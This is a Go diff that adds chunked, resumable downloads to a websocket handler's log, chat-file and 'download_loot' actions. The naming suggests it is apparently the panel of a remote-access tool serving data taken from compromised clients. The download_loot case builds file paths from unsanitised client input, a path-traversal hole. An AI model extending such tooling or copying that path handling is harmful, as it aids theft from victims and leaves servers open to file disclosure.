@@ -835,131 +835,233 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 					file, err := os.Open(logFilePath)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code": 500,
-							"path": "downloadlog",
-
+							"code":    500,
+							"path":    "downloadlog",
 							"message": "failed to open log file",
 						})
-
 						return
 					}
 					defer file.Close()
+				
 					stat, err := file.Stat()
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "downloadlog",
+							"message": "failed to stat log file",
+						})
+						return
+					}
+				
+					offset, sendSize, chunked, err := parseDownloadRange(body, stat.Size())
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "downloadlog",
+							"message": err.Error(),
+						})
+						return
+					}
+				
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":      200,
+						"path":      "downloadlog",
+						"filename":  filepath.Base(logFilePath),
+						"size":      stat.Size(),
+						"offset":    offset,
+						"chunkSize": sendSize,
+						"chunked":   chunked,
+					}); err != nil {
+						return
+					}
+				
+					sentSize, err := writeBinaryRange(clientWs, file, offset, sendSize)
 					if err != nil {
 						return
 					}
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "downloadlog",
-
-						"filename": filepath.Base(logFilePath),
-						"size":     stat.Size(),
-					})
-					buffer := make([]byte, 4096)
-					for {
-						n, err := file.Read(buffer)
-						if n > 0 {
-							err := clientWs.WriteMessage(
-								websocket.BinaryMessage,
-								buffer[:n],
-							)
-							if err != nil {
-								return
-							}
-						}
-						if err == io.EOF {
-							break
-						}
-						if err != nil {
-							return
-						}
+				
+					nextOffset := offset + sentSize
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":       200,
+						"path":       "downloadlog",
+						"message":    "download finished",
+						"filename":   filepath.Base(logFilePath),
+						"size":       stat.Size(),
+						"offset":     offset,
+						"sentSize":   sentSize,
+						"nextOffset": nextOffset,
+						"eof":        nextOffset >= stat.Size(),
+						"chunked":    chunked,
+					}); err != nil {
+						return
 					}
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "downloadlog",
-
-						"message": "download finished",
-					})
-				case "download_loot":
-					uid, ok := body["uid"].(string)
-					if !ok || uid == "" {
+				
+				case "downloadChatFile":
+					filename, ok := body["filename"].(string)
+					if !ok || filename == "" {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "download_loot",
-
-							"message": "uid required",
+							"code":    400,
+							"path":    "downloadChatFile",
+							"message": "missing filename",
 						})
 						return
 					}
-					fileName, ok := body["file"].(string)
-					if !ok || fileName == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "download_loot",
-
-							"message": "file required",
-						})
-						return
-					}
-					filePath := filepath.Join(
-						"uploads",
-						uid,
-						fileName,
-					)
+				
+					filename = filepath.Base(filename)
+					filePath := filepath.Join("./chat_uploads/", filename)
+				
 					info, err := os.Stat(filePath)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code": 404,
-							"path": "download_loot",
-
+							"code":    404,
+							"path":    "downloadChatFile",
 							"message": "file not found",
 						})
 						return
 					}
+				
+					offset, sendSize, chunked, err := parseDownloadRange(body, info.Size())
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "downloadChatFile",
+							"message": err.Error(),
+						})
+						return
+					}
+				
 					file, err := os.Open(filePath)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code": 500,
-							"path": "download_loot",
-
+							"code":    500,
+							"path":    "downloadChatFile",
+							"message": "open file failed",
+						})
+						return
+					}
+					defer file.Close()
+				
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":      200,
+						"path":      "downloadChatFile",
+						"type":      "file_start",
+						"filename":  filename,
+						"size":      info.Size(),
+						"offset":    offset,
+						"chunkSize": sendSize,
+						"chunked":   chunked,
+					}); err != nil {
+						return
+					}
+				
+					sentSize, err := writeBinaryRange(clientWs, file, offset, sendSize)
+					if err != nil {
+						return
+					}
+				
+					nextOffset := offset + sentSize
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":       200,
+						"path":       "downloadChatFile",
+						"type":       "file_end",
+						"filename":   filename,
+						"size":       info.Size(),
+						"offset":     offset,
+						"sentSize":   sentSize,
+						"nextOffset": nextOffset,
+						"eof":        nextOffset >= info.Size(),
+						"chunked":    chunked,
+					}); err != nil {
+						return
+					}
+				
+				case "download_loot":
+					uid, ok := body["uid"].(string)
+					if !ok || uid == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "download_loot",
+							"message": "uid required",
+						})
+						return
+					}
+				
+					fileName, ok := body["file"].(string)
+					if !ok || fileName == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "download_loot",
+							"message": "file required",
+						})
+						return
+					}
+				
+					filePath := filepath.Join("uploads", uid, fileName)
+					info, err := os.Stat(filePath)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    404,
+							"path":    "download_loot",
+							"message": "file not found",
+						})
+						return
+					}
+				
+					offset, sendSize, chunked, err := parseDownloadRange(body, info.Size())
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    400,
+							"path":    "download_loot",
+							"message": err.Error(),
+						})
+						return
+					}
+				
+					file, err := os.Open(filePath)
+					if err != nil {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code":    500,
+							"path":    "download_loot",
 							"message": err.Error(),
 						})
 						return
 					}
 					defer file.Close()
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "download_loot",
-
-						"type":     "file_start",
-						"filename": fileName,
-						"size":     info.Size(),
-					})
-					buffer := make([]byte, 4096)
-					for {
-						n, err := file.Read(buffer)
-						if n > 0 {
-							err := clientWs.WriteMessage(
-								websocket.BinaryMessage,
-								buffer[:n],
-							)
-							if err != nil {
-								return
-							}
-						}
-						if err == io.EOF {
-							break
-						}
-						if err != nil {
-							return
-						}
+				
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":      200,
+						"path":      "download_loot",
+						"type":      "file_start",
+						"filename":  fileName,
+						"size":      info.Size(),
+						"offset":    offset,
+						"chunkSize": sendSize,
+						"chunked":   chunked,
+					}); err != nil {
+						return
 					}
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "download_loot",
+				
+					sentSize, err := writeBinaryRange(clientWs, file, offset, sendSize)
+					if err != nil {
+						return
+					}
+				
+					nextOffset := offset + sentSize
+					if err := clientWs.WriteJSON(map[string]interface{}{
+						"code":       200,
+						"path":       "download_loot",
+						"type":       "file_end",
+						"filename":   fileName,
+						"size":       info.Size(),
+						"offset":     offset,
+						"sentSize":   sentSize,
+						"nextOffset": nextOffset,
+						"eof":        nextOffset >= info.Size(),
+						"chunked":    chunked,
+					}); err != nil {
+						return
+					}
 
-						"type": "file_end",
-					})
 				case "getAll":
 					username, _ := body["username"].(string)
 					shell_list, err := Get_Clients(username)
@@ -1510,77 +1612,6 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						"path": "cleanup",
 
 						"message": "cleanup success",
-					})
-				case "downloadChatFile":
-					filename, ok := body["filename"].(string)
-					if !ok || filename == "" {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 400,
-							"path": "downloadChatFile",
-
-							"message": "missing filename",
-						})
-
-						return
-					}
-					filename = filepath.Base(filename)
-					filePath := filepath.Join(
-						"./chat_uploads/",
-						filename,
-					)
-					info, err := os.Stat(filePath)
-					if err != nil {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 404,
-							"path": "downloadChatFile",
-
-							"message": "file not found",
-						})
-						return
-					}
-					file, err := os.Open(filePath)
-					if err != nil {
-						clientWs.WriteJSON(map[string]interface{}{
-							"code": 500,
-							"path": "downloadChatFile",
-
-							"message": "open file failed",
-						})
-						return
-					}
-					defer file.Close()
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "downloadChatFile",
-
-						"type":     "file_start",
-						"filename": filename,
-						"size":     info.Size(),
-					})
-					buf := make([]byte, 32*1024)
-					for {
-						n, err := file.Read(buf)
-						if n > 0 {
-							err := clientWs.WriteMessage(
-								websocket.BinaryMessage,
-								buf[:n],
-							)
-							if err != nil {
-								return
-							}
-						}
-						if err == io.EOF {
-							break
-						}
-						if err != nil {
-							return
-						}
-					}
-					clientWs.WriteJSON(map[string]interface{}{
-						"code": 200,
-						"path": "downloadChatFile",
-
-						"type": "file_end",
 					})
 				case "change_pro":
 					uid, _ := body["uid"].(string)
@@ -2284,6 +2315,113 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 			}
 		}
 	}
+}
+
+func getOptionalInt64(body map[string]interface{}, key string) (int64, bool, error) {
+	raw, ok := body[key]
+	if !ok || raw == nil {
+		return 0, false, nil
+	}
+	switch v := raw.(type) {
+	case int:
+		return int64(v), true, nil
+	case int32:
+		return int64(v), true, nil
+	case int64:
+		return v, true, nil
+	case float32:
+		if v != float32(int64(v)) {
+			return 0, true, fmt.Errorf("%s must be an integer", key)
+		}
+		return int64(v), true, nil
+	case float64:
+		if v != float64(int64(v)) {
+			return 0, true, fmt.Errorf("%s must be an integer", key)
+		}
+		return int64(v), true, nil
+	case json.Number:
+		n, err := v.Int64()
+		if err != nil {
+			return 0, true, err
+		}
+		return n, true, nil
+	case string:
+		n, err := strconv.ParseInt(v, 10, 64)
+		if err != nil {
+			return 0, true, err
+		}
+		return n, true, nil
+	default:
+		return 0, true, fmt.Errorf("%s must be an integer", key)
+	}
+}
+
+func parseDownloadRange(body map[string]interface{}, totalSize int64) (offset int64, sendSize int64, chunked bool, err error) {
+	offset, hasOffset, err := getOptionalInt64(body, "offset")
+	if err != nil {
+		return 0, 0, false, fmt.Errorf("invalid offset: %w", err)
+	}
+	chunkSize, hasChunkSize, err := getOptionalInt64(body, "chunkSize")
+	if err != nil {
+		return 0, 0, false, fmt.Errorf("invalid chunkSize: %w", err)
+	}
+	chunked = hasOffset || hasChunkSize
+	if !hasOffset {
+		offset = 0
+	}
+	if offset < 0 {
+		return 0, 0, false, fmt.Errorf("offset must be >= 0")
+	}
+	if offset > totalSize {
+		return 0, 0, false, fmt.Errorf("offset exceeds file size")
+	}
+	remaining := totalSize - offset
+	if !hasChunkSize {
+		sendSize = remaining
+	} else {
+		if chunkSize <= 0 {
+			return 0, 0, false, fmt.Errorf("chunkSize must be > 0")
+		}
+		sendSize = chunkSize
+		if sendSize > remaining {
+			sendSize = remaining
+		}
+	}
+	return offset, sendSize, chunked, nil
+}
+
+type binaryMessageWriter interface {
+	WriteMessage(messageType int, data []byte) error
+}
+
+func writeBinaryRange(clientWs binaryMessageWriter, file *os.File, offset int64, sendSize int64) (int64, error) {
+	if _, err := file.Seek(offset, io.SeekStart); err != nil {
+		return 0, err
+	}
+	buf := make([]byte, 32*1024)
+	remaining := sendSize
+	sent := int64(0)
+	for remaining > 0 {
+		readLen := len(buf)
+		if int64(readLen) > remaining {
+			readLen = int(remaining)
+		}
+		n, err := file.Read(buf[:readLen])
+		if n > 0 {
+			if writeErr := clientWs.WriteMessage(websocket.BinaryMessage, buf[:n]); writeErr != nil {
+				return sent, writeErr
+			}
+			sent += int64(n)
+			remaining -= int64(n)
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return sent, err
+		}
+	}
+	return sent, nil
 }
 
 // 接收
